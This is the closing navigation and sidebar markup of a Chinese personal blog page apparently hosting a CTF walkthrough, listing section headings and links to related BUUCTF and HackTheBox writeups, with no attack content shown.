class="pagination-info"><div class="label">下一篇</div><div class="next_info">BUUCTF - BUU BRUTE 1 Writeup</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/01/30/BUUCTF-BUU-BRUTE-1-Writeup/" title="BUUCTF - BUU BRUTE 1 Writeup"><img class="cover" src="/2022/01/30/BUUCTF-BUU-BRUTE-1-Writeup/cover.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-30</div><div class="title">BUUCTF - BUU BRUTE 1 Writeup</div></div></a></div><div><a href="/2022/01/30/BUUCTF-BUU-CODE-REVIEW-1-Writeup/" title="BUUCTF - BUU CODE REVIEW 1 Writeup"><img class="cover" src="/2022/01/30/BUUCTF-BUU-CODE-REVIEW-1-Writeup/cover.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-30</div><div class="title">BUUCTF - BUU CODE REVIEW 1 Writeup</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/uploads/images/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Kur0</div><div class="author-info__description"></div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">9</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Enumeration"><span class="toc-number">1.</span> <span class="toc-text">Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Nmap"><span class="toc-number">1.1.</span> <span class="toc-text">Nmap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-Application"><span class="toc-number">1.2.</span> <span class="toc-text">Web Application</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Vuln"><span class="toc-number">2.</span> <span class="toc-text">Vuln</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SSTI"><span class="toc-number">2.1.</span> <span class="toc-text">SSTI</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">3.</span> <span class="toc-text">Privilege Escalation</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">4.</span> <span class="toc-text">参考资料</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/02/11/HackTheBox-Nunchucks-Walkthrough/" title="HackTheBox Nunchucks Walkthrough"><img src="/2022/02/11/HackTheBox-Nunchucks-Walkthrough/cover.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HackTheBox Nunchucks Walkthrough"/></a><div class="content"><a class="title" href="/2022/02/11/HackTheBox-Nunchucks-Walkthrough/" title="HackTheBox Nunchucks Walkthrough">HackTheBox Nunchucks Walkthrough</a><time datetime="2022-02-11T01:47:03.000Z" title="发表于 2022-02-11 09:47:03">2022-02-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/01/30/BUUCTF-BUU-BRUTE-1-Writeup/" title="BUUCTF - BUU BRUTE 1 Writeup"><img src="/2022/01/30/BUUCTF-BUU-BRUTE-1-Writeup/cover.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="BUUCTF - BUU BRUTE 1 Writeup"/></a><div class="content"><a class="title" href="/2022/01/30/BUUCTF-BUU-BRUTE-1-Writeup/" title="BUUCTF - BUU BRUTE 1 Writeup">BUUCTF - BUU BRUTE 1 Writeup</a><time datetime="2022-01-30T08:10:24.000Z" title="发表于 2022-01-30 16:10:24">2022-01-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/01/30/BUUCTF-BUU-CODE-REVIEW-1-Writeup/" title="BUUCTF - BUU CODE REVIEW 1 Writeup"><img src="/2022/01/30/BUUCTF-BUU-CODE-REVIEW-1-Writeup/cover.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="BUUCTF - BUU CODE REVIEW 1 Writeup"/></a><div class="content"><a class="title" href="/2022/01/30/BUUCTF-BUU-CODE-REVIEW-1-Writeup/" title="BUUCTF - BUU CODE REVIEW 1 Writeup">BUUCTF - BUU CODE REVIEW 1 Writeup</a><time datetime="2022-01-30T04:52:58.000Z" title="发表于 2022-01-30 12:52:58">2022-01-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/09/13/%E8%92%99%E5%8F%A4%E9%A9%AC2020-Wirteups-reverse-specialapk/" title="蒙古马2020 Wirteups:reverse-specialapk"><img src="/2020/09/13/%E8%92%99%E5%8F%A4%E9%A9%AC2020-Wirteups-reverse-specialapk/cover.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="蒙古马2020 Wirteups:reverse-specialapk"/></a><div class="content"><a class="title" href="/2020/09/13/%E8%92%99%E5%8F%A4%E9%A9%AC2020-Wirteups-reverse-specialapk/" title="蒙古马2020 Wirteups:reverse-specialapk">蒙古马2020 Wirteups:reverse-specialapk</a><time datetime="2020-09-13T06:05:06.000Z" title="发表于 2020-09-13 14:05:06">2020-09-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/09/13/%E8%92%99%E5%8F%A4%E9%A9%AC2020-Wirteups-reverse-rev/" title="蒙古马2020 Wirteups:reverse-rev"><img src="/2020/09/13/%E8%92%99%E5%8F%A4%E9%A9%AC2020-Wirteups-reverse-rev/cover.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="蒙古马2020 Wirteups:reverse-rev"/></a><div class="content"><a class="title" href="/2020/09/13/%E8%92%99%E5%8F%A4%E9%A9%AC2020-Wirteups-reverse-rev/" title="蒙古马2020 Wirteups:reverse-rev">蒙古马2020 Wirteups:reverse-rev</a><time datetime="2020-09-13T02:45:06.000Z" title="发表于 2020-09-13 10:45:06">2020-09-13</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Kur0</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">本地搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: 'OTXh1tDsl9N2HUi7g7vqKT1h-gzGzoHsz',
      appKey: '7gVLQUWhTLwzaTQ09Ig8KyQe',
      avatar: 'monsterid',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !false) {
  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script></div></div></body></html>